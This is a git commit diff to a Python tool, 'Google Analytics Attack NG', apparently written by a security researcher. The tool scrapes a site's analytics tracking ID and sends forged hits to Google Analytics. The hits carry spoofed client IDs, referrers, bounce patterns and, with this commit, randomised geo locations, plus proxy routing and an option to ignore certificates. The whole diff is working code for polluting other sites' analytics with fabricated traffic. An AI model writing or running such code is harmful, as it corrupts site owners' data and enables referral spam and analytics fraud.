7370af1906ed1b28541c6225241a4309bc4d212d
Tyler Rosonke <tyler@zonksec.com>
2017-07-12 20:14:18 -0500

    args proxy now supported. added geo radnomization

--- main.py
+++ main.py
@@ -14,23 +14,23 @@ import argparse
 
 def main():
     global proxies
-    global verify_certs
-    verify_certs = True
+    global ignore_certs
+    ignore_certs = False
     proxies = {
-        #'http': 'socks5://192.168.0.103:9100',
-        #'https': 'socks5://192.168.0.103:9100'
+        # 'http': 'socks5://192.168.0.103:9100',
+        # 'https': 'socks5://192.168.0.103:9100'
         #'http': 'http://192.168.0.107:8080',
         #'https': 'https://192.168.0.107:8080'
     }
 
-
     parser = argparse.ArgumentParser(description='Google Analytics Attack NG By ZonkSec')
     parser.add_argument('-m','--mode',choices=['referral_attack', 'traffic_attack'],help='Required. This tells the script which mode to operate in',required=True)
-    parser.add_argument("-v", "--verbose", help="increase output verbosity",action="store_true")
+    parser.add_argument('-v', '--verbose', help="increase output verbosity",action="store_true")
     parser.add_argument('--target_url', help='required.', required=True)
     parser.add_argument('--referral_url', help='required.',required=True)
     parser.add_argument('-n','--number_of_sessions', help='required. total number of sessions to be emulated',required=True,type=int)
     parser.add_argument('--threads', help='number of threads, aka concurrent sessions', default=1, type=int, metavar='')
+    parser.add_argument('--geo_list', help='list of origin geo locations. \'criteriaID\' or \'criteriaIDs-criteriaIDs\'',metavar='',nargs='+')
     parser.add_argument('--user_delay', help='delay between users/threads', default=0, type=int, metavar='')
     parser.add_argument('--user_jitter', help='amount of randomness in user_delay', default=0, type=float, metavar='')
     parser.add_argument('--bounces', help='number of bounces between target pages',type=int,metavar='',default=0)
@@ -40,6 +40,8 @@ def main():
     parser.add_argument('--session_delay',metavar='',help='amount of seconds between bounces in a session',type=int,default=0)
     parser.add_argument('--session_jitter',metavar='',help='amount of randomness in session_delay',type=float,default=0)
     parser.add_argument('--end_with',action="store_true",help='end with a bounce to target page')
+    parser.add_argument('--proxy', help='use a proxy to make requests. note: google searches not included', metavar='')
+    parser.add_argument('--ignore_certs', help='ignore ssl certs when making requests. note: google searches not included',action="store_true")
     args = parser.parse_args()
 
     if args.verbose:
@@ -47,12 +49,49 @@ def main():
     else:
         logging.basicConfig(level=logging.INFO)
 
+    if args.proxy:
+        if re.search("(socks5:\/\/.*:.)", args.proxy):
+            logging.info("[+] Using a SOCK5 proxy: " + args.proxy)
+            proxies['http'] = args.proxy
+            proxies['https'] = args.proxy
+        elif re.search("(http:\/\/.*:.)", args.proxy):
+            logging.info("[+] Using a HTTP proxy: " + args.proxy)
+            proxies['http'] = args.proxy
+            proxies['https'] = args.proxy
+        elif re.search("(https:\/\/.*:.)", args.proxy):
+            logging.info("[+] Using a HTTPS proxy: " + args.proxy)
+            proxies['http'] = args.proxy
+            proxies['https'] = args.proxy
+        else:
+            logging.error('[-] Not a valid proxy definition.')
+            sys.exit(1)
+
+    if args.geo_list:
+        args.geo_list=build_geo_list(args.geo_list)
+    else:
+        args.geo_list = build_geo_list(['1012873-1028514'])
+
+    ignore_certs = args.ignore_certs
+
+
+
     if args.mode == 'referral_attack':
-        session = referral_attack(target_url=args.target_url, referral_url=args.referral_url,bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_jitter, session_jitter=args.session_jitter, session_delay=args.session_delay, end_with=args.end_with,bounce_pool=args.bounce_pool)
+        session = referral_attack(target_url=args.target_url, referral_url=args.referral_url,bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_jitter, session_jitter=args.session_jitter, session_delay=args.session_delay, end_with=args.end_with,bounce_pool=args.bounce_pool,geo_list=args.geo_list)
         single_page_attack(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads,user_delay=args.user_delay,user_jitter=args.user_jitter)
     elif args.mode == 'traffic_attack':
         session = traffic_attack(target_site='http://zonksec.com', target_site_urls=args.traffic_urls,referral_keyword='how to hack',target_site_url_pool=5, referral_pool=10, bounces=2, session_delay=0, session_jitter=0)
         session.run(client_id=402)
+
+def build_geo_list(geo_list):
+    list = []
+    for item in geo_list:
+        if '-' in item:
+            min = int(item.split('-')[0])
+            max = int(item.split('-')[1])
+            list.extend(range(min,max))
+        else:
+            list.append(int(item))
+    return list
 
 
 
@@ -76,16 +115,17 @@ def thread_session(i,q,session,delay=5,jitter=.50):
     while True:
         q.get()
         cid = session.random_unique_cid()
-        logging.debug('[+] Thread' + str(i) + ': Starting a session. CID: ' + str(cid))
-        behavior = session.run(client_id=cid)
-        logging.info('[+] Thread' + str(i) + ': Session complete. CID: '+str(cid)+'. Behavior: '+behavior)
+        geo_id = session.random_geo_id()
+        logging.debug('[+] T' + str(i) + ': Starting a session. CID: ' + str(cid))
+        behavior = session.run(client_id=cid,geo_id=geo_id)
+        logging.info('[+] T' + str(i) + ': Session complete. CID: '+str(cid)+'. GEO_ID: '+str(geo_id)+' Behavior: '+behavior)
         time_delay = delay - random.randint(0, int(delay * jitter))
-        logging.info('[*] Thread' + str(i) + ': Sleeping for '+str(time_delay))
+        logging.info('[*] T' + str(i) + ': Sleeping for '+str(time_delay))
         time.sleep(time_delay)
         q.task_done()
 
 class referral_attack:
-    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, loop=1, end_with=False, tracking_id=None, geo_id='',bounce_jitter=.50):
+    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, loop=1, end_with=False, tracking_id=None, geo_id='',bounce_jitter=.50,geo_list=None):
         self.target_url = target_url
         self.referral_url = referral_url
         self.page_delay = session_delay
@@ -100,6 +140,7 @@ class referral_attack:
         self.tracking_id = tracking_id
         self.bounce_pool = bounce_pool
         self.bounce_jitter = bounce_jitter
+        self.geo_list = geo_list
 
         #end_with logic
         if self.bounces == 0:
@@ -107,7 +148,7 @@ class referral_attack:
 
         #grabs tracking ID from target site.
         if self.tracking_id is None:
-            page = requests.get(target_url,proxies=proxies,verify=verify_certs)
+            page = requests.get(target_url,proxies=proxies,verify=(not ignore_certs))
             m = re.search("'(UA-(.*))',", page.text)
             self.tracking_id = str(m.group(1))
 
@@ -132,16 +173,20 @@ class referral_attack:
                 self.client_id = cid
         return cid
 
+    def random_geo_id(self):
+        return self.geo_list[random.randint(0,len(self.geo_list)-1)]
 
-    def run(self,client_id=None):
-        if client_id is not None:
-            client_id = self.client_id
+
+    def run(self,client_id=None,geo_id=None):
+        if client_id is None or geo_id is None:
+            logging.error('[-] Missing client_id or geo_id')
+            sys.exit(1)
         pages = []
         loop_count = 0
         last_page = self.referral_url
         pages.append(last_page)
         while loop_count < self.loop:
-            target_request = analytics_request(document_location=self.target_url,document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=self.geo_id)
+            target_request = analytics_request(document_location=self.target_url,document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
             target_request.send()
             pages.append('[T]'+self.target_url)
             bounce_count = 0
@@ -151,7 +196,7 @@ class referral_attack:
                 delay = self.page_delay - random.randint(0,int(self.page_delay * self.page_delay_jitter))
                 logging.debug('[*] Session sleep for %i seconds.', delay)
                 time.sleep(delay)
-                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls)-1)],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=self.geo_id)
+                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls)-1)],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
                 bounce_request.send()
                 pages.append(bounce_request.document_location)
                 last_page = bounce_request.document_location
@@ -161,7 +206,7 @@ class referral_attack:
             delay = self.page_delay - random.randint(0, int(self.page_delay * self.page_delay_jitter))
             logging.debug('[*] Session sleep for %i seconds.', delay)
             time.sleep(delay)
-            target_request = analytics_request(document_location=self.target_url, document_referrer=last_page, client_id=client_id,tracking_id=self.tracking_id,geo_id=self.geo_id)
+            target_request = analytics_request(document_location=self.target_url, document_referrer=last_page, client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
             target_request.send()
             pages.append('[T]'+self.target_url)
 
@@ -198,7 +243,7 @@ class traffic_attack:
             sys.exit(1)
 
         if self.tracking_id is None:
-            page = requests.get(self.target_site,proxies=proxies,verify=verify_certs)
+            page = requests.get(self.target_site,proxies=proxies,verify=(not ignore_certs))
             m = re.search("'(UA-(.*))',", page.text)
             self.tracking_id = str(m.group(1))
 
@@ -274,7 +319,7 @@ class analytics_request:
         self.anon_ip = anon_ip
 
         if self.tracking_id is None:
-            page = requests.get(document_location,proxies=proxies,verify=verify_certs)
+            page = requests.get(document_location,proxies=proxies,verify=(not ignore_certs))
             m = re.search("'(UA-(.*))',", page.text)
             self.tracking_id = str(m.group(1))
 
@@ -290,7 +335,7 @@ class analytics_request:
         params['geoid'] = self.geo_id
         params['ua'] = self.user_agent
 
-        r = requests.post('https://www.google-analytics.com/collect', data=params,proxies=proxies,verify=verify_certs)
+        r = requests.post('https://www.google-analytics.com/collect', data=params,proxies=proxies,verify=(not ignore_certs))
         logging.debug('[*] Request Sent. ' + str(params))
 
 
